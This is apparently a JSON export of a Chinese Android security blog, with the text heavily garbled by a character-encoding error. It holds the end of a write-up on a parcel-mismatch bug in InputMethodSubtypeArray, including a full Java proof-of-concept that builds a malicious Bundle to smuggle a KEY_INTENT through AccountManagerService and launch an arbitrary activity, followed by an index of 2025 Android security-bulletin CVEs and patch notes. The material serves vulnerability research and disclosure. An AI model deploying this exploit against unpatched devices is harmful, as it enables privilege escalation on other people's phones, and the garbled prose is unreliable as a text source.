çš„ä¸€éƒ¨åˆ†ï¼Œä¿®æ”¹ intent ä¼šå¯¼è‡´ key çš„ hash code æ”¹å˜ï¼Œè€Œ bundle çš„æ’åºæ˜¯æŒ‰ hash code æ’çš„ï¼Œéœ€è¦å¯¹ bundle é‡Œçš„æ‰€æœ‰ key éƒ½ç²¾å¿ƒå¸ƒå±€é¿å…å‘ç”Ÿé”™ä½ã€‚æˆ‘è¿™é‡Œåªä½¿ç”¨ä¸€ä¸ªå›ºå®šçš„ intent è¿›è¡Œæ¼”ç¤ºï¼Œå› æ­¤åœ¨ä»£ç é‡Œç›´æ¥å†™æ­»å°±å¥½ã€‚PoC å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586 public static Bundle makeBundle(Intent intent) &#123; Parcel parcel = Parcel.obtain(); parcel.writeInt(0); // bundle size parcel.writeInt(0x4C444E44); // BUNDLE_MAGIC_NATIVE, 'B' 'N' 'D' 'N' parcel.writeInt(3); // bundle key-value pair count parcel.writeString(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"); // key of first kv pair, mismatch object is here parcel.writeInt(4); // VAL_PARCELABLE writeMismatchObject(parcel); // value // remaining 24 bytes, write second kv pair parcel.writeString(createStringPayload(intent)); // first interpreted as key parcel.writeInt(-1); // VAL_NULL parcel.writeString(\"zzzzzzzzzzzz\"); // last key parcel.writeInt(-1); // VAL_NULL parcel.setDataPosition(0); parcel.writeInt(parcel.dataSize() - 12); // reset bundle size parcel.setDataPosition(0); Bundle bundle = new Bundle(); bundle.readFromParcel(parcel); parcel.recycle(); return bundle; &#125; private static String createStringPayload(Intent intent) &#123; Parcel parcel = Parcel.obtain(); // -24 parcel.writeInt(0); // string length // -20 parcel.writeInt(1); // -16 parcel.writeInt(2); // -12 parcel.writeInt(3); // -8 parcel.writeInt(4); // -4 parcel.writeInt(0); // string null terminator parcel.writeInt(-1); // VAL_NULL // New Key-Value Pair appears! parcel.writeString(AccountManager.KEY_INTENT); // key parcel.writeInt(4); // VAL_PARCELABLE parcel.writeParcelable(intent, 0); // value parcel.writeInt(0); // string null terminator parcel.setDataPosition(0); parcel.writeInt((parcel.dataSize() - 8) / 2); parcel.setDataPosition(0); try &#123; return parcel.readString(); &#125; finally &#123; parcel.recycle(); &#125; &#125; private static void writeMismatchObject(Parcel parcel) &#123; parcel.writeString(InputMethodInfo.class.getName());// try &#123;// InputMethodInfo inputMethodInfo = new InputMethodInfo(\"aaa\", \"bbb\", \"ccc\", \"ddd\");// Field mSubtypes = InputMethodInfo.class.getDeclaredField(\"mSubtypes\");// mSubtypes.setAccessible(true);// Object subtypes = mSubtypes.get(inputMethodInfo);// Class&lt;?&gt; cls = Class.forName(\"android.view.inputmethod.InputMethodSubtypeArray\");// Field mCount = cls.getDeclaredField(\"mCount\");// mCount.setAccessible(true);// mCount.set(subtypes, -1);// parcel.writeParcelable(inputMethodInfo, 0);// &#125; catch (Exception e) &#123;// throw new RuntimeException(e);// &#125; parcel.writeString(null); // mId parcel.writeString(null); // mSettingsActivityName parcel.writeInt(0); // mIsDefaultResId parcel.writeInt(0); // mIsAuxIme parcel.writeInt(0); // mSupportsSwitchingToNextInputMethod parcel.writeInt(0); // mInlineSuggestionsEnabled parcel.writeInt(0); // mSupportsInlineSuggestionsWithTouchExploration parcel.writeBoolean(false); // mSuppressesSpellChecker parcel.writeBoolean(false); // mShowInInputMethodPicker parcel.writeBoolean(false); // mIsVrOnly; parcel.writeBoolean(false); // mIsVirtualDeviceOnly new ResolveInfo().writeToParcel(parcel, 0); // mService// mSubtypes.writeToParcel(dest); parcel.writeInt(-1); // mSubtypes.mCount parcel.writeInt(0); // mHandledConfigChanges &#125;æˆ‘è¿™é‡Œç”¨ BUNDLE_MAGIC_NATIVE çº¯ç²¹æ˜¯æˆ‘ä¸ªäººå–œæ¬¢ç”¨ï¼Œä¸è¿‡çœ‹å…¶ä»–äººä¼¼ä¹éƒ½ä¸å–œæ¬¢ç”¨è¿™ä¸ªï¼Œç”¨ BUNDLE_MAGIC åº”è¯¥ä¹Ÿèƒ½è§¦å‘ã€‚éšä¾¿æ‰“äº†å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸ºäº†å‡‘ hashï¼Œè™½ç„¶ä¸å¤ªå¥½çœ‹ä½†æ˜¯ it worksæ¨¡æ‹Ÿç³»ç»Ÿè¯»å…¥ bundle ç„¶åè½¬å‘ bundle çš„æµ‹è¯•ä»£ç ï¼š1234567891011121314151617Parcel parcel = Parcel.obtain();Intent intent = new Intent().setClassName(\"android\", \"com.android.internal.app.PlatLogoActivity\");Bundle bundle = makeBundle(intent);// simulate AccountManagerService readparcel.setDataPosition(0);// Authenticator app -&gt; AccountManagerServiceparcel.writeBundle(bundle);parcel.setDataPosition(0);Bundle b1 = parcel.readBundle();Log.e(\"PoC\", \"intent in init bundle: \" + bundle.getParcelable(AccountManager.KEY_INTENT));Log.e(\"PoC\", \"first deserialization: \" + b1.getParcelable(AccountManager.KEY_INTENT));parcel.setDataPosition(0);// AccountManagerService -&gt; callerparcel.writeBundle(b1);parcel.setDataPosition(0);Bundle b2 = parcel.readBundle();Log.e(\"PoC\", \"second deserialization: \" + b2.getParcelable(AccountManager.KEY_INTENT)è¿è¡Œæµ‹è¯•ä»£ç å¯ä»¥å‘ç°ï¼Œç¬¬ä¸€æ¬¡è¯» intent çš„æ—¶å€™è¿”å› nullï¼Œç¬¬äºŒæ¬¡æ¶æ„ intent å‡ºç°ã€‚åœ¨æœªæ‰“è¡¥ä¸ä¸”æ²¡æœ‰ checkKeyIntentParceledCorrectly çš„ Android 12 ç³»ç»Ÿä¸Šï¼ŒæŠŠæ„é€ å¥½çš„ bundle è¿”å›ç»™ AccountManagerServiceï¼ŒPlatLogoActivity ç›´æ¥è¢«æˆåŠŸæ‹‰èµ·ã€‚è‡³äºå®ƒåœ¨æœ‰ checkKeyIntentParceledCorrectly çš„ç³»ç»Ÿä¸Šæœ‰ä»€ä¹ˆä½œç”¨ï¼Œèƒ½é€ æˆä»€ä¹ˆå±å®³ï¼Œå°±ç•™ç»™è¯»è€…è‡ªå·±å»æ€è€ƒã€‚ä¿®å¤2025 å¹´ 2 æœˆ Android å®‰å…¨å…¬å‘Š å¯¹è¯¥æ¼æ´å‘å¸ƒäº†ä¸€ä¸ªè¡¥ä¸ InputMethodSubtypeArray: prevent negative count injectionï¼ŒmCount &lt; 0 çš„æƒ…å†µä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ä¸­æ–­ååºåˆ—åŒ–æµç¨‹ã€‚è¿™ä¸ªè¡¥ä¸è¢«ç§»æ¤åˆ°äº† Android 12ã€12Lã€13 ï¼ˆ14 å·²ç»åŒ…å«è¯¥ä¿®å¤ï¼‰ï¼ŒAndroid 11 æˆ–æ›´ä½ç‰ˆæœ¬å·²ç» EOLã€‚AccountManagerService æ•´ä¸ªæµç¨‹å¯èƒ½ä¼šå¼•å…¥æ–°çš„ä¿æŠ¤ï¼šSanitize Bundle from AbstractAccountAuthenticatorï¼Œapp è¿”å›çš„ bundle ä¸­çš„å†…å®¹ä¼šè¢«æ‹·è´åˆ°ä¸€ä¸ªæ–°çš„ bundle ä¸­ï¼Œä¸”åªæœ‰åœ¨ç™½åå•çš„ key å’Œ value ä¼šè¢«ä¿ç•™ï¼Œè€Œå…è®¸çš„ Parcelable ç±»å‹ä»…æœ‰ AccountManager.KEY_INTENT ä¸€é¡¹ï¼Œé˜»æ­¢äº† bundle å†…å«æœ‰ä»»æ„ Parcelable ç±»å‹è¿›è€Œ mismatchã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¯¥æäº¤ç›®å‰æ˜¯å·²ç»è¢«å›æ»šçš„çŠ¶æ€æ‰€ä»¥å¹¶æœªç”Ÿæ•ˆï¼Œä½†æè¿°ä¸­è¡¨ç¤º A new version will be created.ï¼Œæ‰€ä»¥å¯ä»¥é¢„è®¡å°†ä¼šåœ¨æœªæ¥ç‰ˆæœ¬ä¸­ä¸Šçº¿ã€‚æ€»ç»“è¿™ä¸ªæ¼æ´çš„å†å²éå¸¸ä¹…è¿œï¼Œ2014 å¹´ 3 æœˆ 6 æ—¥å¼•å…¥æ­¤ç±»çš„ç¬¬ä¸€ä¸ªæäº¤ Introduce InputMethodSubtypeArray for memory efficient IPCs å°±å·²ç»å­˜åœ¨æ­¤æ¼æ´ï¼Œå¯èƒ½æ˜¯ Android å²ä¸Šç”Ÿå­˜æ—¶é—´æœ€é•¿çš„ parcel mismatch æ¼æ´ã€‚è€Œç”±äºå…¶ç›´æ¥å­˜åœ¨äº AOSP è€Œé OEM ä»£ç å†…ï¼Œå½±å“èŒƒå›´å¯è°“æ˜¯æå¤§ã€‚æŒ–æ˜æ­¤ç±»æ¼æ´çš„äººåƒåƒä¸‡ï¼Œè¿™ä¸ªç±»å­˜åœ¨çš„åˆ¤æ–­å·®å¼‚ä¹Ÿéå¸¸æ˜æ˜¾ï¼Œä¸ºä»€ä¹ˆå„ç§æ‰«æå™¨éƒ½æ²¡æ‰«å‡ºæ¥è¿™ä¸ªæ´ï¼Ÿæˆ‘è§‰å¾—å¯èƒ½æ˜¯å› ä¸ºè¿™ä¸ªç±»å¹¶æ²¡æœ‰ç›´æ¥å®ç° Parcelable å¯¼è‡´å¤§éƒ¨åˆ†æ‰«æå™¨ä¸€å¼€å§‹å°±ç›´æ¥æŠŠå®ƒå¿½ç•¥äº†ï¼Œå³ä½¿æœ‰çˆ†å‡ºè­¦å‘Šï¼Œç”±äºé€»è¾‘è¾ƒä¸ºå¤æ‚ï¼Œå¾ˆå¯èƒ½åœ¨åç»­çš„äººå·¥ review è¿‡ç¨‹é‡Œè¢«è®¤ä¸ºæ˜¯è¯¯æŠ¥è€Œå¿½ç•¥ã€‚é™¤äº† Google ç»™å‡ºçš„ä¿®å¤æ–¹æ³•ï¼Œå¦ä¸€ç§æ€è·¯æ˜¯æŠŠåºåˆ—åŒ–æµç¨‹é‡Œçš„ if (mCount == 0) æ”¹æˆ if (mCount &lt;= 0)ï¼Œè®©è´Ÿæ•° count ä¹Ÿåªå†™ä¸€ä¸ª int è¿›å»å³å¯ã€‚å¯æƒœè¿™ç§æ–¹æ³•å¹¶æ²¡æœ‰è¢«é‡‡ç”¨ï¼Œè¦ä¸ç„¶æ­¤æ¼æ´è·Ÿä¸Šä¸€æ¬¡è¢«å¤§è§„æ¨¡åˆ©ç”¨çš„åŒç±»æ¼æ´ CVE-2023-20963 å°±å¯ä»¥ä¸€èµ·è¢«ç§°ä¸ºâ€œå°‘æ‰“ä¸€ä¸ªè¿ç®—ç¬¦çš„ä»£ä»·â€äº†ï¼ˆé‚£ä¹ˆï¼Œæ­¤æ¼æ´ç»ˆç»“ä¹‹åï¼Œæˆ‘ä»¬æœ‰äº†ä¸€ä¸ªæ–°çš„ç–‘é—®ï¼šè‡ª 2014 å¹´ï¼ŒAndroid ç³»ç»Ÿå¼€å‘äººå‘˜ã€ä¾›åº”é“¾å¼€å‘è€…åŠå„è®¾å¤‡å‚å•†ç¨‹åºå‘˜å°±ä¸æ–­ä¸æ­¤ç±»ååºåˆ—åŒ–æ¼æ´ä½œæ–—äº‰ï¼Œæ¼æ´ä¸æ–­è¢«å†™å‡ºæ¥åˆä¸æ–­è¢«å‘ç°å’Œä¿®å¤ï¼Œç›´åˆ° 2025 å¹´çš„ä»Šå¤©ï¼Œå¼€å‘äººå‘˜ä¹Ÿæ—¶å¸¸å› ä¸ºå„ç§ç–æ¼è€Œå†™å‡ºç±»ä¼¼ bugã€‚é‚£ä¹ˆï¼Œè¿™ä¸ªæ¼æ´ï¼Œä¼šæ˜¯æœ€åä¸€ä¸ª Parcel Mismatch æ¼æ´å—ï¼Ÿæˆ‘ä»¬æ‹­ç›®ä»¥å¾…ã€‚","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"parcel","slug":"parcel","permalink":"https://blog.canyie.top/tags/parcel/"}]},{"title":"Android 2025 å¹´æ¯æœˆå®‰å…¨è¡¥ä¸åˆ†æç´¢å¼•","slug":"android-security-bulletin-index-2025","date":"2025-01-29T06:00:00.000Z","updated":"2025-06-09T15:29:27.904Z","comments":true,"path":"2025/01/29/android-security-bulletin-index-2025/","link":"","permalink":"https://blog.canyie.top/2025/01/29/android-security-bulletin-index-2025/","excerpt":"2024 å¹´åº¦è¡¥ä¸åˆ†æï¼šç‚¹æˆ‘ç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼Œç»è¿‡ä¸€å¹´çš„ç ”ç©¶ï¼Œæˆ‘ç°åœ¨åœ¨ Google BugHunters å¹³å°ä¸Šæ€»æ’å 32ï¼Œ2024 å¹´åº¦ç¬¬ 6 åï¼ŒAndroid Program ç¬¬ 6 åï¼æ„Ÿè°¢å„ä½ä¸€å¹´é™ªä¼´ï¼æœ€åæ›´æ–°æ—¶é—´ï¼š2025/06/09 æ›´æ–°å†…å®¹ï¼šæ›´æ–° 06","text":"2024 å¹´åº¦è¡¥ä¸åˆ†æï¼šç‚¹æˆ‘ç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼Œç»è¿‡ä¸€å¹´çš„ç ”ç©¶ï¼Œæˆ‘ç°åœ¨åœ¨ Google BugHunters å¹³å°ä¸Šæ€»æ’å 32ï¼Œ2024 å¹´åº¦ç¬¬ 6 åï¼ŒAndroid Program ç¬¬ 6 åï¼æ„Ÿè°¢å„ä½ä¸€å¹´é™ªä¼´ï¼æœ€åæ›´æ–°æ—¶é—´ï¼š2025/06/09 æ›´æ–°å†…å®¹ï¼šæ›´æ–° 06çŠ¶æ€æ›´æ–°ï¼šç”±äºæœ¬äººå¥åº·é—®é¢˜ï¼Œé¢„è®¡è¿‘æœŸå¯¹ç”µå­äº§å“çš„ä½¿ç”¨å°†ä¼šå—é™ï¼Œæ­¤åšå®¢è·Ÿæˆ‘çš„é¢‘é“å¯èƒ½ä¼šæ›´æ–°ç¼“æ…¢ï¼Œå°è¯•è”ç³»æˆ‘å¯èƒ½æ— æ³•è¿é€šæˆ–å›å¤ç¼“æ…¢ï¼Œå»ºè®®å…³æ³¨æˆ‘çš„é¢‘é“è·å–æœ€æ–°çŠ¶æ€2025-06-01Android RuntimeCVE-2025-26456 DoS HighDexUseManager å†…é™åˆ¶ dex ä½¿ç”¨è®°å½•çš„æ•°æ®çš„å¤§å°ã€‚FrameworkCVE-2025-26450 EoP HighKeyEvent å‘é€ç»™è¾“å…¥æ³•ä¹‹å‰å…ˆéªŒè¯å…¶ç¡®å®æ¥è‡ªç³»ç»Ÿï¼Œä¸”å…¶ä¸æ˜¯å¤ªæ—©ä¹‹å‰äº§ç”Ÿçš„ï¼ˆé˜²æ­¢é‡æ”¾æ”»å‡»ï¼‰CVE-2025-26452 EoP HighResourcesImpl åŠ è½½ FRRO çš„æ—¶å€™ä¿è¯å…¶ç¡®å®æ˜¯ä¸€ä¸ª FRRO ï¼ˆåœ¨ /data/resource-cache/ ä¸‹å¹¶ä¸”ä»¥ .frro ç»“å°¾ï¼‰ã€‚çœ‹æ¼æ´æè¿°æ˜¯å¯ä»¥è¯»å…¶ä»– task çš„å¿«ç…§CVE-2025-26455 EoP HighAMediaCodec_getInputBuffer å’Œ AMediaCodec_getOutputBuffer ä¸¤ä¸ªå‡½æ•°çš„è¿”å›å€¼ç›¸å…³çš„è¶Šç•Œå†™å…¥é—®é¢˜CVE-2025-26458 EoP HighLocationProviderManager å†…å‘é€ PendingIntent çš„æ—¶å€™åŠ ä¸Š setPendingIntentBackgroundActivityLaunchAllowed(false) é˜»æ­¢ BALCVE-2025-26462 EoP HighAccessibilityService onBind() è¿”å› null æ—¶éœ€è¦ unbindï¼Œé˜²æ­¢ BALCVE-2025-32312 EoP HighPackageParser æ ¡éªŒè¾“å…¥ç±»åå¿…é¡»æ˜¯ä¸€ä¸ª IntentInfo çš„å­ç±»ï¼Œé˜²æ­¢è°ƒç”¨ä»»æ„ class çš„æ„é€ å‡½æ•°ã€‚è¿™ä¸ªè¡¥ä¸æ‰“æ–­äº† https://github.com/michalbednarski/TheLastBundleMismatch é‡Œç”¨åˆ°çš„ trampolineï¼Œé˜²æ­¢ç»•è¿‡ lazy value ä¿æŠ¤åˆ›é€ å‡º self-changing bundleã€‚CVE-2025-26437 ID HighCredentialManagerService getCandidateCredentials() æ ¡éªŒè°ƒç”¨è€…å¿…é¡»æ˜¯é»˜è®¤çš„ Credential Autofill serviceï¼Œåªå½±å“ 15CVE-2025-26448 ID HighCursorWindow å†…ä½¿ç”¨ calloc ä»£æ›¿ malloc é¿å…æœªåˆå§‹åŒ–å†…å­˜CVE-2025-26432 DoS HighCompanionDeviceManagerService setAssociationTag é™åˆ¶ tag æœ€å¤§é•¿åº¦ä¸º 1024ã€‚åªå½±å“ 15CVE-2025-26449 DoS Highä¼ é€’ AutomaticZenRule å’Œ ZenModeConfig æ—¶ä½¿ç”¨ ParceledListSlice ï¼Œé˜²æ­¢å•æ¬¡æ•°æ®é‡è¿‡å¤§è¶…è¿‡ binder ä¼ è¾“å¤§å°ä¸Šé™CVE-2025-26463 DoS HighBlobStoreManager allowPackageAccess å†…é™åˆ¶ä¼ å…¥åŒ…åå’Œè¯ä¹¦çš„å¤§å°ã€‚SystemCVE-2025-26443 EoP HighManagedProvisioning HtmlToSpannedParser å†…é™åˆ¶ä¼ å…¥çš„ url å¿…é¡»æ˜¯ http æˆ– https çš„ï¼Œçœ‹æ¼æ´æè¿°æ˜¯å¯ä»¥å®‰è£… appï¼ŒçŒœæµ‹æ˜¯ä½¿ç”¨ file æˆ–è€… content çš„ uriã€‚å…¶å®æ²¡çœ‹æ‡‚å’‹åšåˆ°çš„ï¼Œæ˜æ˜ createIntent å†…éƒ¨æœ‰ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„æ£€æŸ¥ï¼Œä¸ºä»€ä¹ˆè¦åœ¨å¤–é¢å†åŠ ä¸€ä¸ªï¼ŸCVE-2025-26441 ID Highè“ç‰™åè®®æ ˆ sdp_discovery.cc ä¸­çš„è¶Šç•Œè¯»å–CVE-2025-26445 ID HighConnectivityService offerNetwork æ·»åŠ æƒé™æ£€æŸ¥ã€‚CVE-2025-26453 ID Highè“ç‰™ BluetoothOppSendFileInfo å†…è¯»å– decode è¿‡çš„ Authority å†æ‰‹åŠ¨è§£æ user id è€Œéä½¿ç”¨ getUserInfoï¼Œé˜²æ­¢è¢« encoded çš„ @ å­—ç¬¦ç»•è¿‡æ£€æŸ¥ï¼Œè·Ÿä¹‹å‰çš„ CVE-2025-0082/CVE-2025-0083 ç±»ä¼¼ã€‚2025-05-01åœ¨é‡åˆ©ç”¨æ¼æ´ï¼šCVE-2025-27363ï¼Œç»ˆäºä¸æ˜¯ USB äº†FrameworkCVE-2023-21342 EoP Highç»‘å®šåˆ°åº”ç”¨æä¾›çš„ speech RecognitionService æ—¶ä¸æŒ‡å®š BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS æ ‡è®°ï¼Œé¿å… BAL bypassAndroid 14 å°±ä¿®äº†çš„æ´ï¼Œç°åœ¨ backport ç»™ 13CVE-2024-34739 EoP Highå»å¹´å…«æœˆå°±æ”¾è¿‡ä¸€éï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆæ”¾äº†ä¸€éã€‚è®¾ç½®å‘å¯¼æœªå®Œæˆæ—¶ï¼Œæ’å…¥ USB è®¾å¤‡ä¸å¼¹å‡º activityï¼Œé¿å… FRP ç»•è¿‡ã€‚CVE-2025-0077 EoP Highåˆ‡æ¢ç”¨æˆ·è¿‡ç¨‹ä¸­çš„ race conditionï¼Œæœ‰æ¦‚ç‡å¯¼è‡´åˆ‡æ¢åˆ°å…¶ä»–ç”¨æˆ·åä¸æ˜¾ç¤ºç›®æ ‡ç”¨æˆ·è®¾ç½®çš„é”å±ã€‚åªå½±å“ 15ã€‚è¿™ä¸ªé—®é¢˜æˆ‘å¾ˆæ—©ä¹Ÿæ³¨æ„åˆ°äº†ï¼Œå¯æƒœä¸€ç›´æ²¡èƒ½ç¨³å®šå¤ç°å‡ºæ¥ã€‚CVE-2025-0087 EoP HighPackageInstaller å†…çš„é€»è¾‘ bugï¼Œè¯·æ±‚ä¸ºå…¶ä»–ç”¨æˆ·å¸è½½ app æ—¶åªåœ¨å½“å‰ç”¨æˆ·æ˜¯ç›®æ ‡ç”¨æˆ·çš„çˆ¶ç”¨æˆ·çš„æƒ…å†µä¸‹æ‰å…è®¸ã€‚CVE-2025-22425 EoP HighPackageInstaller å†…ä½¿ç”¨äº†ä¸å®‰å…¨çš„ getCallingPackage å‡½æ•°è·å–è°ƒç”¨è€…ï¼Œå¯èƒ½è¢«ä¼ªé€ ç»“æœï¼Œæ”¹æˆä½¿ç”¨ getLaunchedFromPackageã€‚CVE-2025-26422 EoP HighWindowManagerService dump å‡½æ•°å†…çš„æƒé™æ£€æŸ¥æ”¾é”™äº†ä½ç½®ï¼Œè°ƒç”¨è€…ä¼ é€’ --high-priority å‚æ•°çš„æ—¶å€™ä¸ä¼šæ£€æŸ¥æƒé™ï¼Œé€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚åªå½±å“ 15ã€‚CVE-2025-26426 EoP HighregisterReceiver åœ¨è°ƒç”¨è€…ç»™å®š caller package = &quot;android&quot; æ—¶éœ€è¦ä¿è¯ calling uid çœŸçš„æ˜¯ core uidã€‚CVE-2025-26427 EoP Highè·Ÿ CVE-2024-0032 ä¸€æ ·ï¼Œé™åˆ¶ä¸è®©è®¿é—® /sdcard/Android/dataã€‚ä¸çŸ¥é“åŒä¸€ä¸ªæ¼æ´è¿˜èƒ½æ”¾å¤šå°‘éã€‚ã€‚ã€‚CVE-2025-26428 EoP Highå¦‚æœå½“å‰ task å·²ç»è¿›å…¥ lock task modeï¼Œå¿½ç•¥åç»­çš„ app pinning è¯·æ±‚ã€‚CVE-2025-26436 EoP Highæ¸…æ¥šä¸€ä¸ª PendingIntentRecord çš„ BAL token çš„æ—¶å€™ä¹Ÿè¦é¡ºå¸¦æ¸…æ‰å®ƒå¸¦çš„ allowlist durationã€‚CVE-2025-26440 EoP HighCameraService ä¼˜åŒ– app å‰åå°çŠ¶æ€æ”¹å˜æ—¶çš„å¤„ç†ä»£ç ï¼Œé¿å…åå° app ä»ç„¶èƒ½ä½¿ç”¨æ‘„åƒå¤´çš„é—®é¢˜CVE-2025-26444 EoP HighVoiceInteractionManagerService ä¼šåœ¨ç”¨æˆ·å¼ºè¡Œåœæ­¢ç¬¬ä¸‰æ–¹è¯­éŸ³åŠ©æ‰‹æ—¶å°†ç›®å‰é€‰æ‹©çš„è¯­éŸ³åŠ©æ‰‹è®¾ç½®æˆç³»ç»Ÿé»˜è®¤çš„ï¼Œé‡è®¾ ROLE_ASSISTANT ä¼šå¯¼è‡´é¢å¤–æƒé™è¢«æˆæƒç»™é»˜è®¤çš„è¯­éŸ³åŠ©æ‰‹ï¼Œè¿™ä¸æ˜¯åˆç†çš„è¡Œä¸ºæ‰€ä»¥åˆ é™¤ç›¸å…³å¤„ç†ã€‚CVE-2025-26424 ID HighVpnManagerService æ–°å¢çš„ getFromVpnProfileStoreã€putIntoVpnProfileStoreã€removeFromVpnProfileStoreã€listFromVpnProfileStore æ·»åŠ æƒé™æ£€æŸ¥ã€‚åªå½±å“ 15CVE-2025-26442 ID Highä¹‹å‰ CVE-2024-49742 çš„è¡¥ä¸æœ‰é—®é¢˜ï¼Œé”™è¯¯çš„æ£€æŸ¥äº† resolve å‡ºæ¥çš„ç»„ä»¶çš„åŒ…åè€Œéæ•´ä¸ªç»„ä»¶åï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å£°æ˜ä¸¤ä¸ªç»„ä»¶çš„æ–¹å¼æ¥ç»•è¿‡è¡¥ä¸ã€‚CVE-2025-26429 DoS HighAppOpsService collectOps å†…é™åˆ¶è¿”å›çš„æ•°æ®å¤§å°ï¼Œé¿å…è¿‡å¤§è¶…è¿‡ binder æ•°æ®ä¼ è¾“å¤§å°é™åˆ¶é€ æˆå¼‚å¸¸ã€‚SystemCVE-2025-27363 RCE Highä¸Šæ¸¸ freetype ä¸­çš„æ•´æ•°æº¢å‡º bugCVE-2025-26420 EoP Highå®˜æ–¹æœªæ”¾å‡ºæ­¤æ¼æ´è¡¥ä¸é“¾æ¥ï¼Œæ‰‹åŠ¨æŸ¥æ‰¾å¾—åˆ°ï¼šhttps://android.googlesource.com/platform/packages/modules/Permission/+/5c07da90f7ae911b9e64d4e34871b7d2115a0a7fçœ‹èµ·æ¥æ˜¯æ˜¾ç¤ºå¤šä¸ªæƒé™è¯·æ±‚å¯¹è¯æ¡†æ—¶çš„å†…å®¹é®ç›–é—®é¢˜ã€‚å®˜æ–¹ç»™å‡ºçš„æ¼æ´æè¿°ï¼šIn multiple functions of GrantPermissionsActivity.java , there is a possible way to trick the user into granting the incorrect permission due to permission overload. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2025-26421 EoP Highæ·»åŠ äº†ä¸€ä¸ªå¯ä»¥è‡ªå®šä¹‰çš„ config_biometric_protected_package_namesï¼Œå½“ç”¨æˆ·åœ¨è®¾ç½®é‡Œå°è¯•å¼ºè¡Œåœæ­¢ã€ç¦ç”¨æˆ–å¸è½½è¿™äº›è¢«ä¿æŠ¤çš„ app çš„æ›´æ–°æ—¶è¦æ±‚ç”¨æˆ·éªŒè¯èº«ä»½å†ç»§ç»­ã€‚æ²¡å¤ªçœ‹æ‡‚ï¼Œæ¼æ´æè¿°ï¼šIn multiple locations, there is a possible lock screen bypass due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2025-26423 EoP Highæ·»åŠ  Wi-Fi ç½‘ç»œæ—¶æ£€æŸ¥é™„å¸¦çš„ IpConfiguration å’Œ ProxyInfo çš„å¤§å°ã€‚CVE-2025-26425 EoP HighRoleService çš„ getDefaultApplicationAsUser/setDefaultApplicationAsUser ä¸¤ä¸ª API é™åˆ¶åªèƒ½åœ¨ Android 14+ ä¸Šè¢«è°ƒç”¨ï¼Œå› ä¸ºé‡Œé¢æ˜¯é€šè¿‡æ£€æŸ¥ MANAGE_DEFAULT_APPLICATIONS è¿™ä¸ªæƒé™æ¥ç¡®ä¿è¿™äº› API ä¸è¢«æ»¥ç”¨çš„ï¼Œåœ¨ Android 13 æˆ–æ›´ä½ç‰ˆæœ¬çš„ç³»ç»Ÿä¸Š MANAGE_DEFAULT_APPLICATIONS æƒé™å¹¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ç¬¬ä¸‰æ–¹ app å¯ä»¥è‡ªå·±å®šä¹‰è¿™ä¸ªæƒé™ç„¶åç»™è‡ªå·±æˆæƒä»è€Œç»•è¿‡ RoleService é‡Œé¢çš„æ£€æŸ¥ã€‚CVE-2025-26430 EoP HighSettings SpaAppBridgeActivity é‡Œæ£€æŸ¥ package name åªèƒ½åŒ…å«åˆæ³•å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹æ˜¯æ³¨å…¥ / å­—ç¬¦ä¼ªé€ åé¢çš„ user idCVE-2025-26435 EoP Highç¦æ­¢è®¿å®¢ç”¨æˆ·ç¦ç”¨ deceptive app scanningCVE-2025-26438 EoP Highè“ç‰™ SMP åè®®å®ç°ä¸­çš„éªŒè¯ç»•è¿‡ bugCVE-2023-35657 ID Highè“ç‰™ BTA å±‚çš„ç±»å‹æ··æ·†ï¼Œä¼šå¯¼è‡´è¶Šç•Œè¯»2025-04-01Android 12 &amp; 12L çš„æ”¯æŒå·²äºæœ¬æœˆç»“æŸï¼Œå‘œå‘œå‘œåœ¨é‡åˆ©ç”¨æ¼æ´ï¼šCVE-2024-53150ã€CVE-2024-53197ï¼Œéƒ½æ˜¯å†…æ ¸ USB æ¨¡å—FrameworkCVE-2025-22429 ID Criticalbundle è§£æè¿‡ç¨‹ä¸­çš„é€»è¾‘ bugï¼Œtry å—ä¸­è°ƒç”¨ readArrayMap è§£æå…¶å€¼ï¼Œfinally å—ä¸­åˆ¤æ–­è‹¥ lazy value æ•°é‡ä¸º 0 åˆ™è¯´æ˜ä¸éœ€è¦ lazy unparcelï¼Œç›´æ¥é‡Šæ”¾ parcelã€‚ä½†è¿™ä¸ª lazy value æ•°é‡æ˜¯ä½¿ç”¨ readArrayMap çš„è¿”å›å€¼æ¥æè¿°çš„ï¼Œå¦‚æœ readArrayMap å·²ç»æˆåŠŸåˆ›å»ºäº†ä¸€äº› LazyValue ä½†åœ¨åç»­è§£æè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œç”±äº readArrayMap å¹¶æ²¡æœ‰æ­£å¸¸è¿”å›è‡ªç„¶ä¹Ÿå°±æ²¡æœ‰è¿”å›å€¼ï¼Œæ­¤æ—¶ä¸Šå±‚è®°å½•çš„ lazy value æ•°é‡è¿˜æ˜¯ 0ï¼Œparcel åœ¨ finally ä¸­è¢«é‡Šæ”¾ï¼Œåç»­ LazyValue å†ä½¿ç”¨ parcel å°±ä¼šäº§ç”Ÿ UAFã€‚æ³¨æ„ï¼Œè‹¥è¿›ç¨‹å¼€å¯äº† Defuse ï¼ˆåœ¨ system_server å†…æ»¡è¶³æ­¤æ¡ä»¶ï¼‰ï¼Œå¯¹ BadParcelableException çš„ catch å—å†…æ¸…ç©ºäº† 